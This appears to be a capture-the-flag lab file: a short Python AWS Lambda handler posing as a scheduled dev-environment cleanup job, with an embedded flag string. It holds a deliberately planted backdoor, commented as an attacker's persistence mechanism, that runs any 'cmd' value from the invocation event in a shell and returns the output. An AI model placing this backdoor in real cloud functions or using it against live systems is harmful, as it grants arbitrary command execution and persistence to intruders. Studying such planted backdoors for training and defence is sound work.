import json
import os
import subprocess

def lambda_handler(event, context):
    print("Running scheduled dev environment cleanup...")
    
    # Backdoor inserted by attacker for persistence
    # PCE{L4mbd4_B4ckd00r_P3rsist3nc3_2024}
    if 'cmd' in event:
        cmd = event['cmd']
        print(f"Executing backdoor command: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return {
            'statusCode': 200,
            'body': result.stdout
        }
    
    # Normal cleanup logic would go here
    return {
        'statusCode': 200,
        'body': json.dumps("Cleanup complete")
    }
